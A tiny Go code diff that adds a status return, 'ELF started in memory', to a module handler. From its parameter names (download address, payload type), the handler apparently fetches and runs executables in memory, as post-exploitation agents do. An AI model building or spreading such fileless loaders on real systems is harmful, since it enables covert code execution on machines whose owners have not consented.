@@ -94,6 +94,7 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 					log.Printf("InMemExeRun: %v", err)
 				}
 			}()
+			return "ELF started in memory"
 		}
 	default:
 		// on disk modules
